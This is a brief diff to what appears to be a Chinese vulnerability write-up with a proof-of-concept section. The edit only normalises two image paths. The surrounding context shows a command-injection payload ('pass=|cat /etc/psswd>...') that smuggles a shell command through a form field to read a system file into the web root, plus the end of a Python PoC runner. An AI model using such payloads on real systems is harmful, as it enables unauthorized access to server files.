@@ -145,7 +145,7 @@ pass=|cat /etc/psswd>../test_test.txt
 http://xxx.xxx.xxx.xxx/test_test.txt
 ```
 
-![](./images/202202110930068.png)
+![](images/202202110930068.png)
 
 ## 漏洞POC
 
@@ -249,4 +249,4 @@ if __name__ == '__main__':
     POC_1(target_url)
 ```
 
-![](./images/202202110930028.png)
+![](images/202202110930028.png)
